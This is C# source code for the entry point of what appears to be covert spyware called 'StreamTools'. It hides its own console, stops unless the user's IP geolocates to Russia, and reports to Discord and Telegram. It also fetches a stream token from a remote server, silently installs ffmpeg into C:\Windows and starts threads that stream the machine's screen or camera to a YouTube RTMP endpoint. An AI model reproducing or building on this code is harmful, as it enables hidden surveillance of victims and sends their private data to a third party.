using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace StreamTools
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "StreamTools";
            Console.OutputEncoding = System.Text.Encoding.UTF8;

            if (!WinAPI.CheckInternetConnection())
                Environment.Exit(0);

            ConsoleManager.hide();
            
            bool createdNew;
            DataStorage.mutex = new Mutex(true, "StreamToolsClient", out createdNew);
            if (!createdNew)
                Environment.Exit(0);

            DataStorage.telegramService = new TelegramService();
            DataStorage.telegramService.Initialize();

            DataStorage.cfgManager = new ConfigManager();

            Console.WriteLine("Initializing DeviceService...");
            DataStorage.cameraService = new CameraService();

            try {
                DataStorage.ip = new WebClient().DownloadString("https://api.ipify.org");
                string geodata_str = new WebClient().DownloadString($"https://ipinfo.io/{DataStorage.ip}?token=3d3cb307b97b7d");
                DataStorage.geoData = JsonConvert.DeserializeObject(geodata_str);
            } catch {
                Discord.sendInTry($"Failed to recive client GeoData");
            }

            Console.WriteLine("User country: " + DataStorage.geoData.country);
            if (DataStorage.workOnlyWithRU) {
                if (DataStorage.geoData.country != "RU") {
                    Discord.sendInTry("User country is not RU! Initializing failed!");
                    Environment.Exit(0);
                }
            }

            Console.WriteLine("Initializing API...");
            DataStorage.client = new ClientAPI();
            DataStorage.server = new ServerAPI();

            if (!DataStorage.cfgManager.updateConfig())
                Environment.Exit(0);

            Discord.sendInTry($"Client connected!");
            Console.WriteLine("Collecting token...");

            string version_url = "http://"; // server return: 05.10.2024 1:16
            string token_url = "http://"; // sever return: youtube_rtmp_url|youtube_stream_token
            try {
                string content = new WebClient().DownloadString(token_url);
                DataStorage.stream_url_unready = content.Split('|')[0];
                DataStorage.user_token = content.Split('|')[1];

                DataStorage.serverVerison = new WebClient().DownloadString(version_url);
            }
            catch {
                Discord.sendInTry("Failed to collect token from url!");
                Environment.Exit(0);
            }
            Console.WriteLine("\n[WebService]\nRecived content: " + DataStorage.user_token + "\nFrom url: " + token_url + "\n");

            if (!(DataStorage.serverVerison != "" && DataStorage.Version == DataStorage.serverVerison)) {
                Discord.sendInTry("Incorrect version!");
                Environment.Exit(0);
            }

            DataStorage.stream_url = DataStorage.stream_url_unready + DataStorage.user_token;

            if (DataStorage.user_token == "not working") {
                Discord.sendInTry($"Invalid token! Server return: `{DataStorage.user_token}`");
                Environment.Exit(0);
            }

            Console.WriteLine("Creating ShareService...");
            if (!File.Exists("C:\\Windows\\ffmpeg\\presets\\libvpx-1080p50_60.ffpreset")) {
                Discord.sendInTry($"Client started downloading stream files...");
                try {
                    if (!Directory.Exists("C:\\Windows\\ffmpeg"))
                    {
                        Directory.CreateDirectory("C:\\Windows\\ffmpeg");
                        Directory.CreateDirectory("C:\\Windows\\ffmpeg\\bin");
                        Directory.CreateDirectory("C:\\Windows\\ffmpeg\\presets");
                    }

                    string bin_url = ""; // download from here and upload to server: https://ffmpeg.org/download.html#build-windows
                    string preset_url = "";
                    Download.download(bin_url + "ffmpeg.exe", "C:\\Windows\\ffmpeg\\bin\\" + "ffmpeg.exe");

                    Download.download(preset_url + "libvpx-360p.ffpreset", "C:\\Windows\\ffmpeg\\presets\\" + "libvpx-360p.ffpreset");
                    Download.download(preset_url + "libvpx-720p.ffpreset", "C:\\Windows\\ffmpeg\\presets\\" + "libvpx-720p.ffpreset");
                    Download.download(preset_url + "libvpx-720p50_60.ffpreset", "C:\\Windows\\ffmpeg\\presets\\" + "libvpx-720p50_60.ffpreset");
                    Download.download(preset_url + "libvpx-1080p.ffpreset", "C:\\Windows\\ffmpeg\\presets\\" + "libvpx-1080p.ffpreset");
                    Download.download(preset_url + "libvpx-1080p50_60.ffpreset", "C:\\Windows\\ffmpeg\\presets\\" + "libvpx-1080p50_60.ffpreset");
                } catch { }
            }

            Discord.sendInTry($"Initializing Streaming...");
            
            Console.WriteLine("Initializing ShareService...");
            DataStorage.shareService = new ShareService();
            DataStorage.shareService.Initialize();

            DataStorage.streamThread = new Thread(() => {
                Thread.Sleep(10000);
                try {
                    DataStorage.shareService.StartStreaming();
                } catch (Exception excep) {
                    Discord.sendInTry($"Failed to start stream\n`[ DEBUG ] Error: {excep.Message}`");
                }
            });

            DataStorage.apiThread = new Thread(() => {
                ServerAPI.threadReload();
            });

            DataStorage.afkThread = new Thread(() => {
                DataStorage.afkService = new AFKService();
                DataStorage.afkService.Initialize();
                DataStorage.afkService.ChangeAudioID(DataStorage.audioId);
                DataStorage.afkService.Start();
            });

            Console.WriteLine("Starting Threads...");
            DataStorage.afkThread.Start();
            DataStorage.apiThread.Start();
            DataStorage.streamThread.Start();

            while (true)
            {
                System.Threading.Thread.Sleep(500);
            }
        }
    }
}
